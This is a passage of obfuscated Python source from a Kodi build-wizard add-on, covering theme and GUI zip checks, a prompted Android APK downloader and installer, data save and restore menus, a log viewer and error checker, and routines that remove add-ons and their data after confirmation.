				if isinstance (O00OO0000OO0O00OO ,unicode ):#line:4997
					O0OO0000OOO00OOOO =O0OO0000OOO00OOOO .encode ('utf-8')#line:4998
				wiz .TextBox (ADDONTITLE ,O0OO0000OOO00OOOO )#line:4999
	DP .close ()#line:5000
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:5001
	if INSTALLMETHOD ==1 :OOOOO00OOOOO0O0OO =1 #line:5002
	elif INSTALLMETHOD ==2 :OOOOO00OOOOO0O0OO =0 #line:5003
	else :OOOOO00OOOOO0O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:5004
	if OOOOO00OOOOO0O0OO ==1 :wiz .reloadFix ()#line:5005
	else :wiz .killxbmc (True )#line:5006
def testTheme (OOO0O00O0O0000O0O ):#line:5008
	OO0OO0OOOO00O00OO =zipfile .ZipFile (OOO0O00O0O0000O0O )#line:5009
	for O00OO000OOO0OOO0O in OO0OO0OOOO00O00OO .infolist ():#line:5010
		if '/settings.xml'in O00OO000OOO0OOO0O .filename :#line:5011
			return True #line:5012
	return False #line:5013
def testGui (O00O0O00OOOOO00O0 ):#line:5015
	OO0O0OO00O0OOOO0O =zipfile .ZipFile (O00O0O00OOOOO00O0 )#line:5016
	for O0OOO0O0O00O00OOO in OO0O0OO00O0OOOO0O .infolist ():#line:5017
		if '/guisettings.xml'in O0OOO0O0O00O00OOO .filename :#line:5018
			return True #line:5019
	return False #line:5020
def apkInstaller (OOOOO0O0OOOOOOO0O ,OOOO0000O00O0OOO0 ):#line:5022
	wiz .log (OOOOO0O0OOOOOOO0O )#line:5023
	wiz .log (OOOO0000O00O0OOO0 )#line:5024
	if wiz .platform ()=='android':#line:5025
		O0000OOOO00O0O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO0O0OOOOOOO0O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:5026
		if not O0000OOOO00O0O0O0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:5027
		OO0O0O00000OO0OO0 =OOOOO0O0OOOOOOO0O #line:5028
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5029
		if not wiz .workingURL (OOOO0000O00O0OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:5030
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00000OO0OO0 ),'','אנא המתן')#line:5031
		O0OOOO0O0000OOO00 =os .path .join (PACKAGES ,"%s.apk"%OOOOO0O0OOOOOOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:5032
		try :os .remove (O0OOOO0O0000OOO00 )#line:5033
		except :pass #line:5034
		downloader .download (OOOO0000O00O0OOO0 ,O0OOOO0O0000OOO00 ,DP )#line:5035
		xbmc .sleep (100 )#line:5036
		DP .close ()#line:5037
		notify .apkInstaller (OOOOO0O0OOOOOOO0O )#line:5038
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0OOOO0O0000OOO00 +'")')#line:5039
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:5040
def createMenu (OO0000O00O00O0O0O ,OOO0OOOO0O0OO00O0 ,O000OO00OO00OO00O ):#line:5046
	if OO0000O00O00O0O0O =='saveaddon':#line:5047
		O00OOO00O00OO0O0O =[]#line:5048
		OOOOO0O0OO0O0O0O0 =urllib .quote_plus (OOO0OOOO0O0OO00O0 .lower ().replace (' ',''))#line:5049
		OO0OO00OOO0O0O0OO =OOO0OOOO0O0OO00O0 .replace ('Debrid','Real Debrid')#line:5050
		OOO00OO0OOO00O0OO =urllib .quote_plus (O000OO00OO00OO00O .lower ().replace (' ',''))#line:5051
		O000OO00OO00OO00O =O000OO00OO00OO00O .replace ('url','URL Resolver')#line:5052
		O00OOO00O00OO0O0O .append ((THEME2 %O000OO00OO00OO00O .title (),' '))#line:5053
		O00OOO00O00OO0O0O .append ((THEME3 %'Save %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5054
		O00OOO00O00OO0O0O .append ((THEME3 %'Restore %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5055
		O00OOO00O00OO0O0O .append ((THEME3 %'Clear %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5056
	elif OO0000O00O00O0O0O =='save':#line:5057
		O00OOO00O00OO0O0O =[]#line:5058
		OOOOO0O0OO0O0O0O0 =urllib .quote_plus (OOO0OOOO0O0OO00O0 .lower ().replace (' ',''))#line:5059
		OO0OO00OOO0O0O0OO =OOO0OOOO0O0OO00O0 .replace ('Debrid','Real Debrid')#line:5060
		OOO00OO0OOO00O0OO =urllib .quote_plus (O000OO00OO00OO00O .lower ().replace (' ',''))#line:5061
		O000OO00OO00OO00O =O000OO00OO00OO00O .replace ('url','URL Resolver')#line:5062
		O00OOO00O00OO0O0O .append ((THEME2 %O000OO00OO00OO00O .title (),' '))#line:5063
		O00OOO00O00OO0O0O .append ((THEME3 %'Register %s'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5064
		O00OOO00O00OO0O0O .append ((THEME3 %'Save %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5065
		O00OOO00O00OO0O0O .append ((THEME3 %'Restore %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5066
		O00OOO00O00OO0O0O .append ((THEME3 %'Import %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5067
		O00OOO00O00OO0O0O .append ((THEME3 %'Clear Addon %s Data'%OO0OO00OOO0O0O0OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOOOO0O0OO0O0O0O0 ,OOO00OO0OOO00O0OO )))#line:5068
	elif OO0000O00O00O0O0O =='install':#line:5069
		O00OOO00O00OO0O0O =[]#line:5070
		OOO00OO0OOO00O0OO =urllib .quote_plus (O000OO00OO00OO00O )#line:5071
		O00OOO00O00OO0O0O .append ((THEME2 %O000OO00OO00OO00O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOO00OO0OOO00O0OO )))#line:5072
		O00OOO00O00OO0O0O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOO00OO0OOO00O0OO )))#line:5073
		O00OOO00O00OO0O0O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOO00OO0OOO00O0OO )))#line:5074
		O00OOO00O00OO0O0O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOO00OO0OOO00O0OO )))#line:5075
		O00OOO00O00OO0O0O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOO00OO0OOO00O0OO )))#line:5076
	O00OOO00O00OO0O0O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:5077
	return O00OOO00O00OO0O0O #line:5078
def toggleCache (OOOO000OOOO0O00O0 ):#line:5080
	OOO00OO000OO00OO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:5081
	OO00O00OO0000O0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:5082
	if OOOO000OOOO0O00O0 in ['true','false']:#line:5083
		for OOO00O000OOOOO00O in OOO00OO000OO00OO0 :#line:5084
			wiz .setS (OOO00O000OOOOO00O ,OOOO000OOOO0O00O0 )#line:5085
	else :#line:5086
		if not OOOO000OOOO0O00O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:5087
			try :#line:5088
				OOO00O000OOOOO00O =OO00O00OO0000O0OO [OOO00OO000OO00OO0 .index (OOOO000OOOO0O00O0 )]#line:5089
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO00O000OOOOO00O ))#line:5090
			except :#line:5091
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOOO000OOOO0O00O0 ))#line:5092
		else :#line:5093
			OO0O0O0OOOO00O0OO ='true'if wiz .getS (OOOO000OOOO0O00O0 )=='false'else 'false'#line:5094
			wiz .setS (OOOO000OOOO0O00O0 ,OO0O0O0OOOO00O0OO )#line:5095
def playVideo (OO0O00O00O0OO000O ):#line:5097
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0O00O00O0OO000O )#line:5098
	if 'watch?v='in OO0O00O00O0OO000O :#line:5099
		O0O00O0OO0OO0OOO0 ,OOO0OOOO000O00000 =OO0O00O00O0OO000O .split ('?')#line:5100
		OO00000O0OOO0OO0O =OOO0OOOO000O00000 .split ('&')#line:5101
		for OO00O0OOO000O0O0O in OO00000O0OOO0OO0O :#line:5102
			if OO00O0OOO000O0O0O .startswith ('v='):#line:5103
				OO0O00O00O0OO000O =OO00O0OOO000O0O0O [2 :]#line:5104
				break #line:5105
			else :continue #line:5106
	elif 'embed'in OO0O00O00O0OO000O or 'youtu.be'in OO0O00O00O0OO000O :#line:5107
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0O00O00O0OO000O )#line:5108
		O0O00O0OO0OO0OOO0 =OO0O00O00O0OO000O .split ('/')#line:5109
		if len (O0O00O0OO0OO0OOO0 [-1 ])>5 :#line:5110
			OO0O00O00O0OO000O =O0O00O0OO0OO0OOO0 [-1 ]#line:5111
		elif len (O0O00O0OO0OO0OOO0 [-2 ])>5 :#line:5112
			OO0O00O00O0OO000O =O0O00O0OO0OO0OOO0 [-2 ]#line:5113
	wiz .log ("YouTube URL: %s"%OO0O00O00O0OO000O )#line:5114
	yt .PlayVideo (OO0O00O00O0OO000O )#line:5115
def viewLogFile ():#line:5117
	OO000O0O0O0O000O0 =wiz .Grab_Log (True )#line:5118
	OO00OOO00O0OO00OO =wiz .Grab_Log (True ,True )#line:5119
	OOOO0OO00O0000000 =0 ;OO0O00OOOO0OO0OO0 =OO000O0O0O0O000O0 #line:5120
	if not OO00OOO00O0OO00OO ==False and not OO000O0O0O0O000O0 ==False :#line:5121
		OOOO0OO00O0000000 =DIALOG .select (ADDONTITLE ,["View %s"%OO000O0O0O0O000O0 .replace (LOG ,""),"View %s"%OO00OOO00O0OO00OO .replace (LOG ,"")])#line:5122
		if OOOO0OO00O0000000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:5123
	elif OO000O0O0O0O000O0 ==False and OO00OOO00O0OO00OO ==False :#line:5124
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:5125
		return #line:5126
	elif not OO000O0O0O0O000O0 ==False :OOOO0OO00O0000000 =0 #line:5127
	elif not OO00OOO00O0OO00OO ==False :OOOO0OO00O0000000 =1 #line:5128
	OO0O00OOOO0OO0OO0 =OO000O0O0O0O000O0 if OOOO0OO00O0000000 ==0 else OO00OOO00O0OO00OO #line:5130
	O0OO000OOO0OOOO00 =wiz .Grab_Log (False )if OOOO0OO00O0000000 ==0 else wiz .Grab_Log (False ,True )#line:5131
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO0O00OOOO0OO0OO0 ),O0OO000OOO0OOOO00 )#line:5133
def errorChecking (log =None ,count =None ,all =None ):#line:5135
	if log ==None :#line:5136
		O00O0OOO000000O0O =wiz .Grab_Log (True )#line:5137
		O0OOOOOOO0OOOOOO0 =wiz .Grab_Log (True ,True )#line:5138
		if not O0OOOOOOO0OOOOOO0 ==False and not O00O0OOO000000O0O ==False :#line:5139
			OO00O0OOO0OO00O0O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O00O0OOO000000O0O .replace (LOG ,""),errorChecking (O00O0OOO000000O0O ,True ,True )),"View %s: %s error(s)"%(O0OOOOOOO0OOOOOO0 .replace (LOG ,""),errorChecking (O0OOOOOOO0OOOOOO0 ,True ,True ))])#line:5140
			if OO00O0OOO0OO00O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:5141
		elif O00O0OOO000000O0O ==False and O0OOOOOOO0OOOOOO0 ==False :#line:5142
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:5143
			return #line:5144
		elif not O00O0OOO000000O0O ==False :OO00O0OOO0OO00O0O =0 #line:5145
		elif not O0OOOOOOO0OOOOOO0 ==False :OO00O0OOO0OO00O0O =1 #line:5146
		log =O00O0OOO000000O0O if OO00O0OOO0OO00O0O ==0 else O0OOOOOOO0OOOOOO0 #line:5147
	if log ==False :#line:5148
		if count ==None :#line:5149
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:5150
			return False #line:5151
		else :#line:5152
			return 0 #line:5153
	else :#line:5154
		if os .path .exists (log ):#line:5155
			O000O0O00O000000O =open (log ,mode ='r');OO000000O0000O0OO =O000O0O00O000000O .read ().replace ('\n','').replace ('\r','');O000O0O00O000000O .close ()#line:5156
			OOOOO0O0OOOO00000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO000000O0000O0OO )#line:5157
			if not count ==None :#line:5158
				if all ==None :#line:5159
					OOO0O0O0OOO00O0OO =0 #line:5160
					for O0OO00000OOO0O00O in OOOOO0O0OOOO00000 :#line:5161
						if ADDON_ID in O0OO00000OOO0O00O :OOO0O0O0OOO00O0OO +=1 #line:5162
					return OOO0O0O0OOO00O0OO #line:5163
				else :return len (OOOOO0O0OOOO00000 )#line:5164
			if len (OOOOO0O0OOOO00000 )>0 :#line:5165
				OOO0O0O0OOO00O0OO =0 ;O00O000OO00OOO0O0 =""#line:5166
				for O0OO00000OOO0O00O in OOOOO0O0OOOO00000 :#line:5167
					if all ==None and not ADDON_ID in O0OO00000OOO0O00O :continue #line:5168
					else :#line:5169
						OOO0O0O0OOO00O0OO +=1 #line:5170
						O00O000OO00OOO0O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO0O0O0OOO00O0OO ,O0OO00000OOO0O00O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:5171
				if OOO0O0O0OOO00O0OO >0 :#line:5172
					wiz .TextBox (ADDONTITLE ,O00O000OO00OOO0O0 )#line:5173
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:5174
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:5175
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:5176
ACTION_PREVIOUS_MENU =10 #line:5178
ACTION_NAV_BACK =92 #line:5179
ACTION_MOVE_LEFT =1 #line:5180
ACTION_MOVE_RIGHT =2 #line:5181
ACTION_MOVE_UP =3 #line:5182
ACTION_MOVE_DOWN =4 #line:5183
ACTION_MOUSE_WHEEL_UP =104 #line:5184
ACTION_MOUSE_WHEEL_DOWN =105 #line:5185
ACTION_MOVE_MOUSE =107 #line:5186
ACTION_SELECT_ITEM =7 #line:5187
ACTION_BACKSPACE =110 #line:5188
ACTION_MOUSE_LEFT_CLICK =100 #line:5189
ACTION_MOUSE_LONG_CLICK =108 #line:5190
def LogViewer (default =None ):#line:5192
	class OO0O000OO00O0O0O0 (xbmcgui .WindowXMLDialog ):#line:5193
		def __init__ (O0OO0OO000000OOO0 ,*OO0OO0OOOO0O0O000 ,**O0O0O00O00O00000O ):#line:5194
			O0OO0OO000000OOO0 .default =O0O0O00O00O00000O ['default']#line:5195
		def onInit (OO0O000OO00O00OOO ):#line:5197
			OO0O000OO00O00OOO .title =101 #line:5198
			OO0O000OO00O00OOO .msg =102 #line:5199
			OO0O000OO00O00OOO .scrollbar =103 #line:5200
			OO0O000OO00O00OOO .upload =201 #line:5201
			OO0O000OO00O00OOO .kodi =202 #line:5202
			OO0O000OO00O00OOO .kodiold =203 #line:5203
			OO0O000OO00O00OOO .wizard =204 #line:5204
			OO0O000OO00O00OOO .okbutton =205 #line:5205
			OO0O00OOO000000OO =open (OO0O000OO00O00OOO .default ,'r')#line:5206
			OO0O000OO00O00OOO .logmsg =OO0O00OOO000000OO .read ()#line:5207
			OO0O00OOO000000OO .close ()#line:5208
			OO0O000OO00O00OOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O000OO00O00OOO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:5209
			OO0O000OO00O00OOO .showdialog ()#line:5210
		def showdialog (OO0O0OOOO0O0OO000 ):#line:5212
			OO0O0OOOO0O0OO000 .getControl (OO0O0OOOO0O0OO000 .title ).setLabel (OO0O0OOOO0O0OO000 .titlemsg )#line:5213
			OO0O0OOOO0O0OO000 .getControl (OO0O0OOOO0O0OO000 .msg ).setText (wiz .highlightText (OO0O0OOOO0O0OO000 .logmsg ))#line:5214
			OO0O0OOOO0O0OO000 .setFocusId (OO0O0OOOO0O0OO000 .scrollbar )#line:5215
		def onClick (OO00000OO0000O0OO ,O000OO0OO0OO0O0O0 ):#line:5217
			if O000OO0OO0OO0O0O0 ==OO00000OO0000O0OO .okbutton :OO00000OO0000O0OO .close ()#line:5218
			elif O000OO0OO0OO0O0O0 ==OO00000OO0000O0OO .upload :OO00000OO0000O0OO .close ();uploadLog .Main ()#line:5219
			elif O000OO0OO0OO0O0O0 ==OO00000OO0000O0OO .kodi :#line:5220
				OO00000000O00OOOO =wiz .Grab_Log (False )#line:5221
				O0O00OO00OO0OOOO0 =wiz .Grab_Log (True )#line:5222
				if OO00000000O00OOOO ==False :#line:5223
					OO00000OO0000O0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5224
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .msg ).setText ("Log File Does Not Exists!")#line:5225
				else :#line:5226
					OO00000OO0000O0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00OO00OO0OOOO0 .replace (LOG ,''))#line:5227
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .title ).setLabel (OO00000OO0000O0OO .titlemsg )#line:5228
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .msg ).setText (wiz .highlightText (OO00000000O00OOOO ))#line:5229
					OO00000OO0000O0OO .setFocusId (OO00000OO0000O0OO .scrollbar )#line:5230
			elif O000OO0OO0OO0O0O0 ==OO00000OO0000O0OO .kodiold :#line:5231
				OO00000000O00OOOO =wiz .Grab_Log (False ,True )#line:5232
				O0O00OO00OO0OOOO0 =wiz .Grab_Log (True ,True )#line:5233
				if OO00000000O00OOOO ==False :#line:5234
					OO00000OO0000O0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5235
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .msg ).setText ("Log File Does Not Exists!")#line:5236
				else :#line:5237
					OO00000OO0000O0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00OO00OO0OOOO0 .replace (LOG ,''))#line:5238
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .title ).setLabel (OO00000OO0000O0OO .titlemsg )#line:5239
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .msg ).setText (wiz .highlightText (OO00000000O00OOOO ))#line:5240
					OO00000OO0000O0OO .setFocusId (OO00000OO0000O0OO .scrollbar )#line:5241
			elif O000OO0OO0OO0O0O0 ==OO00000OO0000O0OO .wizard :#line:5242
				OO00000000O00OOOO =wiz .Grab_Log (False ,False ,True )#line:5243
				O0O00OO00OO0OOOO0 =wiz .Grab_Log (True ,False ,True )#line:5244
				if OO00000000O00OOOO ==False :#line:5245
					OO00000OO0000O0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5246
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .msg ).setText ("Log File Does Not Exists!")#line:5247
				else :#line:5248
					OO00000OO0000O0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00OO00OO0OOOO0 .replace (ADDONDATA ,''))#line:5249
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .title ).setLabel (OO00000OO0000O0OO .titlemsg )#line:5250
					OO00000OO0000O0OO .getControl (OO00000OO0000O0OO .msg ).setText (wiz .highlightText (OO00000000O00OOOO ))#line:5251
					OO00000OO0000O0OO .setFocusId (OO00000OO0000O0OO .scrollbar )#line:5252
		def onAction (OOOOOO0O0OOOO000O ,OOOO00000000000OO ):#line:5254
			if OOOO00000000000OO ==ACTION_PREVIOUS_MENU :OOOOOO0O0OOOO000O .close ()#line:5255
			elif OOOO00000000000OO ==ACTION_NAV_BACK :OOOOOO0O0OOOO000O .close ()#line:5256
	if default ==None :default =wiz .Grab_Log (True )#line:5257
	OOOOO000O00O0OO0O =OO0O000OO00O0O0O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5258
	OOOOO000O00O0OO0O .doModal ()#line:5259
	del OOOOO000O00O0OO0O #line:5260
def removeAddon (OO00O0000O0O0OO0O ,OOOO00O00OOO0OO0O ,over =False ):#line:5262
	if not over ==False :#line:5263
		O0OO0OO00O000OO0O =1 #line:5264
	else :#line:5265
		O0OO0OO00O000OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO00O00OOO0OO0O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO00O0000O0O0OO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5266
	if O0OO0OO00O000OO0O ==1 :#line:5267
		O00O00O00000000O0 =os .path .join (ADDONS ,OO00O0000O0O0OO0O )#line:5268
		wiz .log ("Removing Addon %s"%OO00O0000O0O0OO0O )#line:5269
		wiz .cleanHouse (O00O00O00000000O0 )#line:5270
		xbmc .sleep (1000 )#line:5271
		try :shutil .rmtree (O00O00O00000000O0 )#line:5272
		except Exception as O0OO00OO000OO0OOO :wiz .log ("Error removing %s"%OO00O0000O0O0OO0O ,xbmc .LOGNOTICE )#line:5273
		removeAddonData (OO00O0000O0O0OO0O ,OOOO00O00OOO0OO0O ,over )#line:5274
	if over ==False :#line:5275
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOOO00O00OOO0OO0O ))#line:5276
def removeAddonData (OOO0OOOOOO00OOO00 ,name =None ,over =False ):#line:5278
	if OOO0OOOOOO00OOO00 =='all':#line:5279
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5280
			wiz .cleanHouse (ADDOND )#line:5281
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5282
	elif OOO0OOOOOO00OOO00 =='uninstalled':#line:5283
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5284
			OO000OO0OO00O0OOO =0 #line:5285
			for OO00000O0OOOO0OO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:5286
				O0O0OO000OO0OO00O =OO00000O0OOOO0OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5287
				if O0O0OO000OO0OO00O in EXCLUDES :pass #line:5288
				elif os .path .exists (os .path .join (ADDONS ,O0O0OO000OO0OO00O )):pass #line:5289
				else :wiz .cleanHouse (OO00000O0OOOO0OO0 );OO000OO0OO00O0OOO +=1 ;wiz .log (OO00000O0OOOO0OO0 );shutil .rmtree (OO00000O0OOOO0OO0 )#line:5290
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO000OO0OO00O0OOO ))#line:5291
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5292
	elif OOO0OOOOOO00OOO00 =='empty':#line:5293
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5294
			OO000OO0OO00O0OOO =wiz .emptyfolder (ADDOND )#line:5295
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO000OO0OO00O0OOO ))#line:5296
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5297
	else :#line:5298
		OOO00OO0OO00OOOOO =os .path .join (USERDATA ,'addon_data',OOO0OOOOOO00OOO00 )#line:5299
		if OOO0OOOOOO00OOO00 in EXCLUDES :#line:5300
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5301
		elif os .path .exists (OOO00OO0OO00OOOOO ):#line:5302
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OOOOOO00OOO00 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5303
				wiz .cleanHouse (OOO00OO0OO00OOOOO )#line:5304
				try :#line:5305
					shutil .rmtree (OOO00OO0OO00OOOOO )#line:5306
				except :#line:5307
					wiz .log ("Error deleting: %s"%OOO00OO0OO00OOOOO )#line:5308
			else :#line:5309
				wiz .log ('Addon data for %s was not removed'%OOO0OOOOOO00OOO00 )#line:5310
	wiz .refresh ()#line:5311
def restoreit (OO0OO0OO0O00OOOOO ):#line:5313
	if OO0OO0OO0O00OOOOO =='build':#line:5314
		OOOO0OO0OOO0OOO0O =freshStart ('restore')#line:5315
		if OOOO0OO0OOO0OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5316
